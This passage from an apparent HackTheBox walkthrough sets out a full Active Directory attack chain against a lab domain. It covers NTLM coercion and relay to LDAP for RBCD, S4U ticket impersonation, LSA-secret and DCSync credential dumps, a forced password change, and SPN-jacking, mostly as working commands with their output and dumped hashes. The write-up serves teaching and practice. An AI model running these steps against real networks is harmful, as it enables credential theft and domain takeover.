There’s a shortcut here (which is actually the way I originally solved) that will jump ahead that I’ll show in [Beyond Root](#shortcut-path).

### NTLMv1 Capture

I’ll configure to [Responder](https://github.com/lgandx/Responder) to use a common challenge of `1122334455667788` in the `Responder.conf` file, and then start it listening to capture the hash. I’ll use the `--disable-ess` flag to make sure my host is advertising only the least secure options.

The `netexec` module `coerce_plus` will try a bunch of ways to coerce authentication back to me:

```
oxdf@hacky$ proxychains -q netexec smb WEB01.pirate.htb -u 'MS01$' -p ms01 -k -M coerce_plus -o LISTENER=10.10.15.169
SMB         WEB01.pirate.htb 445    WEB01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:WEB01) (domain:pirate.htb) (signing:False) (SMBv1:False)
SMB         WEB01.pirate.htb 445    WEB01            [+] pirate.htb\MS01$:ms01 
COERCE_PLUS WEB01.pirate.htb 445    WEB01            VULNERABLE, PetitPotam
COERCE_PLUS WEB01.pirate.htb 445    WEB01            VULNERABLE, PrinterBug
COERCE_PLUS WEB01.pirate.htb 445    WEB01            Exploit Success, spoolss\RpcRemoteFindFirstPrinterChangeNotificationEx
COERCE_PLUS WEB01.pirate.htb 445    WEB01            VULNERABLE, MSEven
```

It reports finding several vulnerable methods, and at Responder I see a lot of hits:

```
oxdf@hacky$ sudo uv run Responder.py -I tun0 --disable-ess
...[snip]...
[+] Listening for events...

[SMB] NTLMv1-SSP Client   : 10.129.60.234
[SMB] NTLMv1-SSP Username : PIRATE\WEB01$
[SMB] NTLMv1-SSP Hash     : WEB01$::PIRATE:108B2084AFE5E41A2716F2C34FA16EF5108BB8E25A6D8541:108B2084AFE5E41A2716F2C34FA16EF5108BB8E25A6D8541:1122334455667788
[*] Skipping previously captured hash for PIRATE\WEB01$
...[snip]...
```

This is a Net-NTLMv1 challenge response for the machine account, given that NT and the LM hashes are the same, that means it’s the non-ESS form. The challenge at the end is the one I configured in `Responder.conf`.

This hash isn’t really a hash, but a challenge and response, and therefore I can’t use it to authenticate directly. The [ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) tool can convert this into a format that can be cracked by `hashcat` using mode 14000. On my host this was going to take well over a day to bruteforce all possible passwords. On a pentest this would almost certainly be worth it, but for HTB it’s way too much. There used to be a site, [crack.sh](https://crack.sh/), which had a rainbow table of all possible passwords using the challenge “1122334455667788”, but it’s been off-line for a while now.

### Relay

#### Strategy

I can’t crack the captured NTLMv1 hash, but I can still get the machine account, WEB01$, to authenticate to me. Rather than trying to recover its password, I’ll relay that authentication to take some actions as that machine account. I’ve shown I can coerce SMB and HTTP auth (through webdav). I can’t relay SMB to the DC because SMB signing is enabled on the DC. I could try relaying SMB to ADCS enrollment on the DC, but the `/certsrv` returns 404. I can’t relay SMB to LDAP on the DC because the SMB auth negotiates signing, and the MIC over the NTLM messages prevents downgrading it, so the DC enforces signing on the LDAP bind. I also can’t relay it back to WEB01 itself. Even though WEB01’s SMB signing is disabled, Windows blocks relaying an authentication back to the host it came from (NTLM reflection protection).

HTTP relay is much more promising. I can go to LDAP (where there’s no MIC / signing constraint) and relay cleanly.

There are several tried and true options for coercing auth to a host I control:

| Method | WebDAV / port 80? |
| --- | --- |
| PetitPotam (MS-EFSRPC) | ✅ yes |
| DFSCoerce (MS-DFSNM) | ✅ yes |
| ShadowCoerce (MS-FSRVP) | ✅ yes |
| MS-EVEN (eventlog backup) | ✅ yes |
| PrinterBug (MS-RPRN) | ❌ SMB only |

To attack, I’ll first add a DNS record pointing to my host. These coercions are more reliable when connecting to a hostname than an IP.

Then I’ll use `ntlmrelayx` to listen and catch the auth, relaying it to the DC. The `--delegate-access` option will have it create a new fake host, and then as the WEB01$ machine account, allow that fake machine account to impersonate any user on WEB01. That is resource-based constrained delegation (RBCD).

#### Attack

I’ll create a hostname in DNS:

```
oxdf@hacky$ uv run /opt/krbrelayx/dnstool.py -u 'pirate.htb\pentest' -p 'p3nt3st2025!&' -a add -t A -r 0xdf.pirate.htb -d 10.10.15.169 -dns-ip 10.129.60.234 DC01.pirate.htb
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

This registers `0xdf.pirate.htb` as 10.10.15.169 on the DC. It works:

```
oxdf@hacky$ dig 0xdf.pirate.htb @DC01.pirate.htb +short
10.10.15.169
```

Now I’ll start `ntlmrelayx`:

```lua
oxdf@hacky$ ntlmrelayx.py -t ldap://DC01.pirate.htb -smb2support --delegate-access
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client WINRMS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Setting up MSSQL Server on port 1433
[*] Setting up RDP Server on port 3389
[*] Multirelay disabled

[*] Servers started, waiting for connections
```

It hangs, listening.

I’ll run `coercer` (`uv tool install coercer`) to coerce authentication:

```bash
oxdf@hacky$ proxychains coercer coerce -u pentest -p 'p3nt3st2025!&' -d pirate.htb -t WEB01.pirate.h
tb -l 0xdf --auth-type http --dc-ip 192.168.100.1
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
       ______
      / ____/___  ___  _____________  _____
     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
    / /___/ /_/ /  __/ /  / /__/  __/ /      v2.4.3
    \____/\____/\___/_/   \___/\___/_/       by @podalirius_

[info] Starting coerce mode
[info] Scanning target WEB01.pirate.htb
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:135  ...  OK
[*] DCERPC portmapper discovered ports: 49664,49665,49667,49709,49688,49689,49693
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:49688  ...  OK
[+] DCERPC port '49688' is accessible!
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:49688  ...  OK
   [+] Successful bind to interface (12345678-1234-ABCD-EF00-0123456789AB, 1.0)!
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:445  ...  OK
[+] SMB named pipe '\PIPE\efsrpc' is accessible!
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:445  ...  OK
   [+] Successful bind to interface (df1941c5-fe89-4e79-bf10-463657acf44d, 1.0)!
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:445  ...  OK
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcAddUsersToFile(FileName='\\0xdf@80/mhf\share\file.txt\x00')
Continue (C) | Skip this function (S) | Stop exploitation (X) ? x
[+] All done! Bye Bye!
```

I’ll exit after one, as it worked:

```javascript
[*] (HTTP): Client requested path: /tid/pipe/srvsvc
[*] (HTTP): Client requested path: /tid/pipe/srvsvc
[*] (HTTP): Client requested path: /tid/pipe/srvsvc
[*] (HTTP): Client requested path: /tid/pipe/srvsvc
[*] (HTTP): Client requested path: /mhf/pipe/srvsvc
[*] (HTTP): Client requested path: /mhf/pipe/srvsvc
[*] (HTTP): Connection from 10.129.60.234 controlled, attacking target ldap://DC01.pirate.htb
[*] (HTTP): Client requested path: /mhf/pipe/srvsvc
[*] (HTTP): Authenticating connection from PIRATE/WEB01$@10.129.60.234 against ldap://DC01.pirate.htb SUCCEED [1]
[*] ldap://PIRATE/WEB01$@dc01.pirate.htb [1] -> Enumerating relayed user's privileges. This may take a while on large domains
[*] (HTTP): Client requested path: /mhf/pipe/srvsvc
[*] (HTTP): Client requested path: /mhf/pipe/srvsvc
[*] (HTTP): Connection from 10.129.60.234 controlled, attacking target ldap://DC01.pirate.htb
[*] (HTTP): Client requested path: /mhf/pipe/srvsvc
[*] ldap://PIRATE/WEB01$@dc01.pirate.htb [1] -> Adding a machine account to the domain requires TLS but ldap:// scheme provided. Switching target to LDAPS via StartTLS
[*] (HTTP): Authenticating connection from PIRATE/WEB01$@10.129.60.234 against ldap://DC01.pirate.htb SUCCEED [2]
[*] ldap://PIRATE/WEB01$@dc01.pirate.htb [2] -> Enumerating relayed user's privileges. This may take a while on large domains
[*] ldap://PIRATE/WEB01$@dc01.pirate.htb [2] -> Adding a machine account to the domain requires TLS but ldap:// scheme provided. Switching target to LDAPS via StartTLS
[*] ldap://PIRATE/WEB01$@dc01.pirate.htb [1] -> Attempting to create computer in: CN=Computers,DC=pirate,DC=htb
[*] ldap://PIRATE/WEB01$@dc01.pirate.htb [2] -> Attempting to create computer in: CN=Computers,DC=pirate,DC=htb
[*] ldap://PIRATE/WEB01$@dc01.pirate.htb [2] -> Adding new computer with username: ZVFMJSLQ$ and password: cwSg(SalAcM6aL5 result: OK
[*] ldap://PIRATE/WEB01$@dc01.pirate.htb [1] -> Adding new computer with username: XXDHZHBA$ and password: 0z5{^C5m^hB$$oD result: OK
[*] ldap://PIRATE/WEB01$@dc01.pirate.htb [2] -> Delegation rights modified successfully!
[*] ldap://PIRATE/WEB01$@dc01.pirate.htb [2] -> ZVFMJSLQ$ can now impersonate users on WEB01$ via S4U2Proxy
[*] ldap://PIRATE/WEB01$@dc01.pirate.htb [1] -> Delegation rights modified successfully!
[*] ldap://PIRATE/WEB01$@dc01.pirate.htb [1] -> XXDHZHBA$ can now impersonate users on WEB01$ via S4U2Proxy
```

It created two machine accounts and configured resource-based constrained delegation (RBCD) on WEB01, writing those accounts into WEB01’s `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. That tells WEB01 to trust either account to act on behalf of any user, so I can now request Kerberos tickets to WEB01 impersonating a privileged user like Administrator.

#### Auth

Now I can auth as that machine account impersonating the Administrator account for a specific service on WEB01:

```swift
oxdf@hacky$ getST.py -spn cifs/WEB01.pirate.htb -impersonate Administrator -dc-ip 10.129.60.234 'pirate.htb/XXDHZHBA$:0z5{^C5m^hB$$oD'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
```

And get a shell as Administrator on WEB01:

```
oxdf@hacky$ proxychains wmiexec.py -k -no-pass WEB01.pirate.htb
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:445  ...  OK
[*] SMBv3.0 dialect used
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:49689  ...  OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
pirate\administrator

C:\>hostname
WEB01
```

And I can grab `user.txt` from `C:\Users\A.White\Desktop`:

```
C:\users\a.white\desktop>type user.txt
c2832025************************
```

## Auth as A.White

### Enumeration

There’s nothing really new or interesting to find in the filesystem as Administrator (other than `user.txt`).

I noted [above](#users-3) that A.White was logged into WEB01. On HTB, that typically means that auto-login credentials are stored. I can find those with `secretsdump.py` using my Administrator access:

```
oxdf@hacky$ proxychains secretsdump.py Administrator@WEB01.pirate.htb -no-pass -k
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:445  ...  OK
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x342dfe90cc4061078b79f011cd08f931
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b1aac1584c2ea8ed0a9429684e4fc3e5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:60da2d3ba00d6b5932e4c87dce6fa6b4:::
[*] Dumping cached domain logon information (domain/username:hash)
PIRATE.HTB/Administrator:$DCC2$10240#Administrator#8baf09ddc5830ac4456ee8639dd89644: (2026-02-25 02:41:09+00:00)
PIRATE.HTB/gMSA_ADFS_prod$:$DCC2$10240#gMSA_ADFS_prod$#66812dfee46ff41c9c8245a2819c3183: (2026-02-25 17:59:14+00:00)
PIRATE.HTB/a.white:$DCC2$10240#a.white#366c8924be3ea6d1d12825569a4bcc39: (2026-08-17 00:33:05+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
PIRATE\WEB01$:aes256-cts-hmac-sha1-96:57b48ef53425adf16b2409ea4d980de1007c9f61b126bdc1c05d3d830c727526
PIRATE\WEB01$:aes128-cts-hmac-sha1-96:b6b018d4edd476f0999d6f666844cf77
PIRATE\WEB01$:des-cbc-md5:efdf97b9a1e06243
PIRATE\WEB01$:plain_password_hex:29f1505d87014b01b4317fed1d52ddbee2792a698e7e1de1bcdf29ab5d4b8e54828ce470d23491ba84e82d786622a821a14c730cf8610a32db1951b7619ee08c3bcacbab53aac8e052bd64e638c6bbd9529daacf04f86cfb9034808c4378d2c328c8c6afe7655f4a099dc41caeb6279c53313edcbd58db3e14490b7543ba3250ac200ec9834992b61b3f4319162645b50f402de4db0843fc43db7d54e04828abf86e490959bc88670e50f0b50373a3745f70039f8fd032435c4a725526957c7ae0dbaa81273b3aa28c0b029fea90c271b6601ef3ba7a05a13ec8c8ffd9999dd10eee87b4b9eb08a8a4af90710056f558
PIRATE\WEB01$:aad3b435b51404eeaad3b435b51404ee:feba09cf0013fbf5834f50def734bca9:::
[*] DefaultPassword
PIRATE\a.white:E2nvAOKSz5Xz2MJu
[*] DPAPI_SYSTEM
dpapi_machinekey:0x01cffc2ef9a91d20107371f9a4a4112c892ed989
dpapi_userkey:0xa4fddb1b2df2db7cc3d044dc1b559bc1b45a1de9
[*] NL$KM
 0000   A5 24 39 57 3F 8F 30 DC  61 F1 56 B7 B5 5C 0F 7C   .$9W?.0.a.V..\.|
 0010   6B 0A FF DF B0 A2 99 C3  68 A9 FE 15 E2 48 33 A9   k.......h....H3.
 0020   E9 8C 27 F8 8B 7C 05 55  4D FE 3C 5D 09 EA 9C 49   ..'..|.UM.<]...I
 0030   95 EB 7A 09 5B 48 7A 14  DC 74 E9 CB 7C 1A E0 8A   ..z.[Hz..t..|...
NL$KM:a52439573f8f30dc61f156b7b55c0f7c6b0affdfb0a299c368a9fe15e24833a9e98c27f88b7c05554dfe3c5d09ea9c4995eb7a095b487a14dc74e9cb7c1ae08a
[*] _SC_GMSA_DPAPI_{C6810348-4834-4a1e-817D-5838604E6004}_a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11
 0000   E3 EF 47 4B 98 13 8D D4  46 9F 6D C1 76 F8 79 BA   ..GK....F.m.v.y.
 0010   1E 08 17 BA 44 50 21 87  B9 08 0B 9F 33 34 C9 1B   ....DP!.....34..
 0020   9B 1A F1 CE 4E 91 FB 56  2C 8D 88 24 41 2C 70 0E   ....N..V,..$A,p.
 0030   00 D1 05 BC 67 4D 8E 26  A5 94 E3 DA 41 73 F2 C8   ....gM.&....As..
 0040   73 13 D6 34 B3 9C 34 12  D4 BF B6 84 92 47 68 6D   s..4..4......Ghm
 0050   F6 06 5B 53 65 66 80 7E  0A CE 92 F9 4E A3 16 6B   ..[Sef.~....N..k
 0060   B9 75 2D 12 D3 52 C8 9B  9F DA FA 7D 31 71 E4 DD   .u-..R.....}1q..
 0070   55 BE 9D 58 55 04 F8 C6  28 A0 FF 4C 67 0D 75 95   U..XU...(..Lg.u.
 0080   A9 09 A3 C9 A7 EC 2D FF  98 4E 5D DF 77 04 9A 91   ......-..N].w...
 0090   A5 59 7F 0A 39 C5 49 94  55 67 59 01 CC E4 1A DE   .Y..9.I.UgY.....
 00a0   D9 8D 80 A1 B5 F7 F8 2C  C2 20 B5 90 DF 4B FC 0B   .......,. ...K..
 00b0   FC 5F 0F EB 66 E7 3A 56  F1 AB 7F E9 14 C6 D7 CD   ._..f.:V........
 00c0   2B 83 E0 B9 06 5B 76 E0  2B C3 30 F7 69 44 16 F3   +....[v.+.0.iD..
 00d0   AC D6 C4 63 DF 84 92 35  00 B6 4A 10 14 E7 44 13   ...c...5..J...D.
 00e0   80 9A 7A 06 AF 57 7C E7  68 5B FD 2A B5 6A 20 67   ..z..W|.h[.*.j g
_SC_GMSA_DPAPI_{C6810348-4834-4a1e-817D-5838604E6004}_a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11:e3ef474b98138dd4469f6dc176f879ba1e0817ba44502187b9080b9f3334c91b9b1af1ce4e91fb562c8d8824412c700e00d105bc674d8e26a594e3da4173f2c87313d634b39c3412d4bfb6849247686df6065b536566807e0ace92f94ea3166bb9752d12d352c89b9fdafa7d3171e4dd55be9d585504f8c628a0ff4c670d7595a909a3c9a7ec2dff984e5ddf77049a91a5597f0a39c5499455675901cce41aded98d80a1b5f7f82cc220b590df4bfc0bfc5f0feb66e73a56f1ab7fe914c6d7cd2b83e0b9065b76e02bc330f7694416f3acd6c463df84923500b64a1014e74413809a7a06af577ce7685bfd2ab56a2067
[*] _SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11
 0000   01 00 00 00 22 01 00 00  10 00 00 00 12 01 1A 01   ...."...........
 0010   B6 C4 08 39 11 A2 83 50  B1 FD 69 48 80 36 50 E1   ...9...P..iH.6P.
 0020   B1 C5 74 1F 77 19 B1 F4  FF 92 62 03 DC DF 4E C9   ..t.w.....b...N.
 0030   C0 36 9B 7B 92 FE 10 A2  D7 FF 95 3B FA 40 6A 3B   .6.{.......;.@j;
 0040   67 86 52 3E D8 27 67 CC  8F E2 73 4A F8 92 E9 8E   g.R>.'g...sJ....
 0050   FB EF 2B 34 76 75 90 32  B4 EC DE F3 42 76 C3 63   ..+4vu.2....Bv.c
 0060   B8 A9 41 0B 63 D8 09 EA  6E F1 67 F5 B5 41 D7 3C   ..A.c...n.g..A.<
 0070   3A C4 21 4D A2 2A 14 D9  79 82 C9 28 D9 1B B9 71   :.!M.*..y..(...q
 0080   FE 99 D4 80 9C 1E BD EA  E8 E7 69 C6 B3 37 7E E1   ..........i..7~.
 0090   A4 78 DF FB B2 DD C1 33  18 BE 13 11 67 D1 A4 A0   .x.....3....g...
 00a0   18 33 A4 C2 7E 05 12 69  0D 73 DE 1E 59 A0 17 61   .3..~..i.s..Y..a
 00b0   EC 7D 40 FC 18 82 05 0C  BF 43 9D 9C BB 28 1A 06   .}@......C...(..
 00c0   D4 BF 8D 85 D1 FE B2 74  0E C3 99 EC A0 E4 6E 36   .......t......n6
 00d0   99 0B 72 B2 C4 A6 4A E0  09 BA FB 3D FD 26 4F F7   ..r...J....=.&O.
 00e0   34 B6 3F B9 22 60 9E 8C  30 58 83 A7 5D 9A EF 75   4.?."`..0X..]..u
 00f0   CE 37 BC A0 91 04 36 59  0D 93 12 FC A4 6A D8 9A   .7....6Y.....j..
 0100   61 A8 9B DD C8 73 19 7D  E4 8E AB 3D 69 B9 E4 98   a....s.}...=i...
 0110   00 00 19 41 B0 1B 73 17  00 00 19 E3 DF 68 72 17   ...A..s......hr.
 0120   00 00                                              ..
_SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11:01000000220100001000000012011a01b6c4083911a28350b1fd6948803650e1b1c5741f7719b1f4ff926203dcdf4ec9c0369b7b92fe10a2d7ff953bfa406a3b6786523ed82767cc8fe2734af892e98efbef2b3476759032b4ecdef34276c363b8a9410b63d809ea6ef167f5b541d73c3ac4214da22a14d97982c928d91bb971fe99d4809c1ebdeae8e769c6b3377ee1a478dffbb2ddc13318be131167d1a4a01833a4c27e0512690d73de1e59a01761ec7d40fc1882050cbf439d9cbb281a06d4bf8d85d1feb2740ec399eca0e46e36990b72b2c4a64ae009bafb3dfd264ff734b63fb922609e8c305883a75d9aef75ce37bca0910436590d9312fca46ad89a61a89bddc873197de48eab3d69b9e49800001941b01b7317000019e3df6872170000
[*] Cleaning up...
[*] Stopping service RemoteRegistry
```

It’s easy to miss in all that output, but the line is:

```
[*] DefaultPassword
PIRATE\a.white:E2nvAOKSz5Xz2MJu
```

I can check that with my shell:

```
C:\>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DefaultDomainName    REG_SZ    PIRATE
    DefaultUserName    REG_SZ    a.white
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ    
    LegalNoticeText    REG_SZ    
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    ShellAppRuntime    REG_SZ    ShellAppRuntime.exe
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0xdf8ec1d0
    ShutdownFlags    REG_DWORD    0x13
    AutoAdminLogon    REG_SZ    1
    AutoLogonSID    REG_SZ    S-1-5-21-4107424128-4158083573-1300325248-3101
    LastUsedUsername    REG_SZ    a.white

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserDefaults
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey
```

The password isn’t stored in this registry key. It’s stored encrypted as an LSA secret.

### Auth

These creds do work for A.White:

```css
oxdf@hacky$ netexec smb DC01.pirate.htb -u a.white -p E2nvAOKSz5Xz2MJu
SMB         10.129.60.234   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.60.234   445    DC01             [+] pirate.htb\a.white:E2nvAOKSz5Xz2MJu
```

## Auth as A.White_adm

### Enumeration

A.White is not a member of any group that allows for shell access. I could use `RunasCs.exe` to get a shell, but there’s no need at this time. They don’t have a home directory on DC01, and I’ve got full Administrator access to WEB01.

BloodHound does show that A.White has `ForceChangePassword` over A.White_adm:

![image-20260819083852905](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/e4c818629b568e3e.png)

![image-20260819083852905](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260819083852905.webp)

### Password Change

I’ll change the password with `bloodyAD` (`uv tool install bloodyAD`):

```
oxdf@hacky$ bloodyAD --host DC01.pirate.htb -d pirate.htb -u a.white -p E2nvAOKSz5Xz2MJu set password a.white_adm '0xdf0xdf.'
[+] Password changed successfully!
```

It works:

```css
oxdf@hacky$ netexec smb DC01.pirate.htb -u a.white_adm -p 0xdf0xdf.
SMB         10.129.60.234   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.60.234   445    DC01             [+] pirate.htb\a.white_adm:0xdf0xdf.
```

## Shell as Administrator on DC01

### Enumeration

A.White_adm is in the IT group, which has `WriteSPN` over the four computer objects on the domain:

![image-20260819090129696](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/68acdac5b1cfd9ca.png)

![image-20260819090129696](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260819090129696.webp)

Combining this with the delegation observed [above](#delegation), I have enough to do a SPN-jacking attack.

### SPN-Jacking

#### Strategy

As A.White_adm, I can impersonate any user to the SPN `HTTP/WEB01`. That’s meant to be the HTTP service on the WEB01 account. During S4U2Proxy the KDC:

1.  Checks `HTTP/WEB01` is in a.white_adm’s allowed list.
2.  Looks up whichever account currently owns the SPN `HTTP/WEB01` and encrypts the resulting ticket with that account’s key.

Currently that account is WEB01$ (as shown in the list of SPNs in BloodHound):

![image-20260819091049444](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/5d28e1d57c7cfc9d.png)

![image-20260819091049444](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260819091049444.webp)

But as I can change the SPNs, I can make that whatever I want, including the DC account.

#### Execute

Two computers can’t both have the same SPN, so I’ll remove it from WEB01:

```
oxdf@hacky$ bloodyAD --host DC01.pirate.htb -d pirate.htb -u a.white_adm -p 0xdf0xdf. msldap delspn "CN=WEB01,CN=COMPUTERS,DC=PIRATE,DC=HTB" "HTTP/WEB01.pirate.htb"
SPN removed!
```

I can get the distinguished name from BloodHound. Now I’ll add the same SPN to DC01:

```
oxdf@hacky$ bloodyAD --host DC01.pirate.htb -d pirate.htb -u a.white_adm -p 0xdf0xdf. msldap addspn "CN=DC01,OU=DOMAIN CONTROLLERS,DC=PIRATE,DC=HTB" "HTTP/WEB01.pirate.htb"
SPN added!
```

Now I request a ticket:

```
oxdf@hacky$ getST.py -spn HTTP/WEB01.pirate.htb -impersonate Administrator -dc-ip 10.129.60.234 'pirate.htb/a.white_adm:0xdf0xdf.'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@HTTP_WEB01.pirate.htb@PIRATE.HTB.ccache
```

I can also request for an alternative service. A Kerberos service ticket is encrypted with the service account’s long-term key, and a single account owns many SPNs that all share that one key. DC01$ owns `cifs/DC01`, `ldap/DC01`, `host/DC01`, `http/DC01`, etc. It also now owns `HTTP/WEB01`. All of these are encrypted with the same key.

When a service receives your ticket, it validates it by decrypting with its own machine key. If the ticket decrypts, it’s trusted. Windows does not verify that the service-class in the sname (HTTP vs CIFS) matches the specific service handling the request. `-altservice` in `getST.py` will allow me to switch targets:

```sql
oxdf@hacky$ getST.py -spn HTTP/WEB01.pirate.htb -impersonate Administrator -dc-ip 10.129.60.234 -altservice CIFS/DC01.pirate.htb 'pirate.htb/a.white_adm:0xdf0xdf.'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Changing service from HTTP/WEB01.pirate.htb@PIRATE.HTB to CIFS/DC01.pirate.htb@PIRATE.HTB
[*] Saving ticket in Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
```

#### Secrets Dump

I’ll use this CIFS ticket to dump the administrator hash from the DC:

```ruby
oxdf@hacky$ KRB5CCNAME=Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache secretsdump.py -k -no-pass -just-dc-user administrator pirate.htb/Administrator@DC01.pirate.htb
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:598295e78bd72d66f837997baf715171:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9918bbcfaaad184f895a36edb7aab5bff972912dcf436cf490fc6618cf7bfb56
Administrator:aes128-cts-hmac-sha1-96:7ab7e5b8e8c440068cb254a33a49973f
Administrator:des-cbc-md5:08c1f7b9269bba9d
